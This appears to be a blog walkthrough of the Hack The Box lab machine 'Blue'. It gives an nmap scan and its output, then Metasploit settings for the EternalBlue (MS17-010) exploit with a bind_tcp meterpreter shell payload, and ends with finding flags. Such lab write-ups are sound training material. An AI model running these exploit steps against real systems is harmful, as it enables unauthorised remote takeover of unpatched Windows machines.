+++
title = "HTB - Blue"
date = 2024-09-16
+++

<img alt="Image" async src="images/Blue.png" width="800px"></img>

Blue is perhaps the most trademarked and popular box on the platform, and for good reason. It's a very easy and simple setup meant to test the attacker's understanding of metasploit, CVE research, and basic linux commands. There is no better place to start, so why don't we?
# Scan

Our Scan:
`nmap -sV -sC --open -p- 10.10.10.40` 

The Result:
```
Nmap scan report for 10.10.10.40
Host is up (0.13s latency).
Not shown: 64243 closed tcp ports (reset), 1283 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m56s, deviation: 34m34s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-09-03T00:23:26
|_  start_date: 2024-09-03T00:20:34
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-09-03T01:23:29+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.69 seconds
```

Our NMAP scan gives us solid information. We've got host names, remote procedure call (RPC) ports, etc. The gem here lies in the smb scripts NMAP has run for us! We can see an outdated version of Windows 7, and upon further research, can recognize the vulnerability in MS17_010 or Eternal Blue. This will be our attack vector.

# Initial Access

In order to press on, we need to fire up msfconsole, and search for our proper exploit.

`search exploit/windows/smb/ms17_010_eternalblue` 

Once found, we can configure out options to reflect:

`RHOSTS: 10.0.10.40`
`RPORT: 445`
`LHOST: 10.0.2.15`
`LPORT: 4444`

Additionally, the `reverse/tcp` recommended payload kept throwing errors for me, so I opted for a `bind_tcp` meterpreter session instead.

`set payload windows/x64/meterpreter/bind_tcp`

This yields a shell:

<img alt="Image" async src="images/Screenshot 2024-09-02 at 9.13.55 PM.png" width="800px"></img>

Now, we need to root around for a flag. Use `pwd` and `ls` to scope surroundings, and use `cd ../` to backtrack out of the nonsense. Once the users directory is found, navigate towards the desktop, where the flag resides. I'll let you grab these for yourself! 

#easy #windows #msfconsole 